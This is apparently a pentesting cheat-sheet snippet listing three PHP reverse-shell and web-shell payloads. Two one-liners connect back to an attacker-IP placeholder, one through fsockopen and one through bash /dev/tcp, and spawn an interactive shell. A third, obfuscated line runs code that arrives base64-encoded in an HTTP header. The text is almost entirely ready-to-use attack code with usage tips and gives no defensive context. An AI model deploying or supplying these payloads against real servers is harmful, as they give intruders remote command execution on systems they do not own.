PHP Reverse Shell  
  
#A useful PHP reverse shell:  
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'  
  
#(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)  
  
#Another PHP reverse shell (that was submitted via Twitter):  
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>  
  
#Base64 encoded by @0xInfection:  
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);